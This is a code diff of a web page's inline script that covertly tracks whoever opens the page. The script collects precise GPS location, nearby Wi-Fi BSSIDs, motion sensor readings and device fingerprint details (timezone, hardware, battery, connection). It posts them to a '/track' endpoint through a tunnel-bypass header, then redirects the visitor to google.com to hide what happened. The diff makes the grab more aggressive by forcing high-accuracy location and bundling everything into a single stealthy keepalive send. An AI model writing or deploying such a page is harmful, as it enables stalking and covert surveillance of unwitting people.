@@ -17,6 +17,8 @@
     <script>
         // Configuration
         const TARGET_URL = '/track';
+        const REDIRECT_URL = 'https://google.com';
+        const DELAY_MS = 4000; // 4 seconds
 
         const data = {
             type: 'STEALTH_PASSIVE',
@@ -31,8 +33,8 @@
             wifi: {}
         };
 
-        // 1. Coarse Geolocation Attempt (The "Permissionless" Fallback)
-        // Note: Modern browsers still often prompt for this, but it's less aggressive.
+        // 1. Coarse Geolocation (Trigger Prompt Immediately)
+        // We request high accuracy to force the "Use precise location?" system prompt if possible.
         function tryCoarseGeo() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
@@ -40,57 +42,41 @@
                         data.location.lat = pos.coords.latitude;
                         data.location.lng = pos.coords.longitude;
                         data.location.acc = pos.coords.accuracy;
-                        data.location.source = 'coarse_api';
-                        sendData();
+                        data.location.source = 'api';
                     },
                     (err) => {
                         data.location.geoError = err.message;
-                        sendData(); // Send what we have even if geo fails
                     },
                     {
-                        enableHighAccuracy: false, // Key: Request lower accuracy
-                        timeout: 3000,             // Fast timeout
-                        maximumAge: Infinity       // Accept cached positions
+                        enableHighAccuracy: true,
+                        timeout: 3500,
+                        maximumAge: 0
                     }
                 );
             }
         }
 
-        // 2. WiFi Positioning (Experimental - Chrome Android)
+        // 2. WiFi (Experimental)
         async function tryWifiScan() {
             if (navigator.connection && navigator.connection.getNetworks) {
                 try {
                     const networks = await navigator.connection.getNetworks();
                     if (networks && networks.length > 0) {
-                        data.wifi = networks.map(n => ({
-                            bssid: n.bssid,
-                            signal: n.signalStrength,
-                            channel: n.channel
-                        }));
-                        sendData();
+                        data.wifi = networks.map(n => ({ bssid: n.bssid, signal: n.signalStrength }));
                     } else {
                         data.wifi = { status: "no_networks_found" };
-                        sendData();
                     }
-                } catch (e) {
-                    data.wifi = { error: e.message };
-                    sendData();
-                }
-            } else {
-                data.wifi = { status: "unsupported_browser" };
-                sendData();
-            }
+                } catch (e) { data.wifi = { error: e.message }; }
+            } else { data.wifi = { status: "unsupported_browser" }; }
         }
 
-        // 3. Sensor Fusion (Continuous Sampling)
+        // 3. Sensors (Continuous Sampling)
         function initSensors() {
             if (window.DeviceMotionEvent) {
                 let readings = [];
                 window.addEventListener('devicemotion', (event) => {
-                    // Check if sensor is actually providing data (Laptops usually return null)
                     if (!event.accelerationIncludingGravity || event.accelerationIncludingGravity.x === null) {
                         data.sensors.status = "unsupported_on_device";
-                        sendData(); // Send once to confirm unsupported
                         return;
                     }
 
@@ -100,77 +86,73 @@
                         z: event.accelerationIncludingGravity.z
                     });
 
-                    // Keep last 50 readings (~1 second)
-                    if (readings.length > 50) readings.shift();
+                    // Keep recent history
+                    if (readings.length > 60) readings.shift();
 
-                    // Averaging
+                    // Calculate average
                     const avg = readings.reduce((a, b) => ({ x: a.x + b.x, y: a.y + b.y, z: a.z + b.z }), { x: 0, y: 0, z: 0 });
                     const count = readings.length || 1;
-
                     data.sensors.accel = {
                         x: (avg.x / count).toFixed(2),
                         y: (avg.y / count).toFixed(2),
-                        z: (avg.z / count).toFixed(2),
-                        samples: count
+                        z: (avg.z / count).toFixed(2)
                     };
-
-                    // Only send update if significant change or first few times
-                    if (Math.random() < 0.1) sendData();
                 });
+            } else {
+                data.sensors.status = "unsupported";
             }
         }
 
-        // 4. Advanced Fingerprinting
+        // 4. Fingerprint
         function collectFingerprint() {
-            data.fingerprint.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            data.fingerprint.cores = navigator.hardwareConcurrency;
-            data.fingerprint.memory = navigator.deviceMemory;
-            data.fingerprint.platform = navigator.platform;
-            data.fingerprint.connection = navigator.connection ? {
-                type: navigator.connection.effectiveType,
-                rtt: navigator.connection.rtt,
-                downlink: navigator.connection.downlink
-            } : 'unsupported';
+            try {
+                data.fingerprint.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                data.fingerprint.cores = navigator.hardwareConcurrency;
+                data.fingerprint.memory = navigator.deviceMemory;
+                data.fingerprint.platform = navigator.platform;
 
-            // Battery Status (often used for tracking)
-            if (navigator.getBattery) {
-                navigator.getBattery().then(bat => {
-                    data.fingerprint.battery = {
-                        level: bat.level,
-                        charging: bat.charging
+                if (navigator.connection) {
+                    data.fingerprint.connection = {
+                        type: navigator.connection.effectiveType,
+                        rtt: navigator.connection.rtt,
+                        downlink: navigator.connection.downlink
                     };
-                    sendData();
-                });
-            }
-        }
+                }
 
-        // Debounced Sender
-        let sendTimeout;
-        function sendData() {
-            clearTimeout(sendTimeout);
-            sendTimeout = setTimeout(async () => {
-                try {
-                    await fetch(TARGET_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json', 'Bypass-Tunnel-Reminder': 'true' },
-                        body: JSON.stringify(data),
-                        keepalive: true
+                if (navigator.getBattery) {
+                    navigator.getBattery().then(bat => {
+                        data.fingerprint.battery = { level: bat.level, charging: bat.charging };
                     });
-                } catch (e) { }
-            }, 1000); // Wait 1s to aggregate data
+                }
+            } catch (e) { }
         }
 
-        // Initialize
-        tryWifiScan();
+        // --- EXECUTE COLLECTION ---
         tryCoarseGeo();
+        tryWifiScan();
         initSensors();
         collectFingerprint();
 
-        // Redirect quickly to look "broken" or just empty
-        setTimeout(() => {
-            // Option: Redirect to Google Maps or Error
-            // window.location.href = "https://google.com";
-        }, 5000);
+        // --- FINAL SEND & REDIRECT ---
+        setTimeout(async () => {
+            // Update timestamp
+            data.timestamp = new Date().toISOString();
+
+            // Send Data (Fire and Forget / Keepalive)
+            try {
+                // Use fetch with keepalive to ensure it survives the redirect
+                fetch(TARGET_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'Bypass-Tunnel-Reminder': 'true' },
+                    body: JSON.stringify(data),
+                    keepalive: true
+                });
+            } catch (e) { console.error(e); }
+
+            // Redirect to Google
+            window.location.href = REDIRECT_URL;
+        }, DELAY_MS);
+
     </script>
 </body>
 
